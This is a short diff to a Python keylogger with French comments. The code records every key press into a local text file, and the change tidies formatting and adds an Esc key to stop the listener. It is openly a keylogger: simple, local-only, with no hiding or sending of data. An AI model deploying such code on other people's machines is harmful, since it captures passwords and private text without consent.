@@ -14,14 +14,21 @@ def onPush(key):
             with open("keylogger.txt", "a") as f:
                 f.write(" ")  # on ecrit un espace
         elif key == keyboard.Key.enter:
-            with open("keylogger.txt","a") as f:
-                f.write("\n")   # on ecrit dans le fichier un saut à la ligne
+            with open("keylogger.txt", "a") as f:
+                f.write("\n")  # on ecrit dans le fichier un saut à la ligne
         else:
-            with open("keylogger.txt","a") as f:
+            with open("keylogger.txt", "a") as f:
                 f.write(f"{key}")
 
+def onRelease(key):
+    """
+    arrete le programme par la touche esc
+    """
+
+    if key == keyboard.Key.esc:
+        return False
 
 
 if __name__ == "__main__":
-    with keyboard.Listener(on_press=onPush) as listener:
+    with keyboard.Listener(on_press=onPush,on_release=onRelease) as listener:
         listener.join()
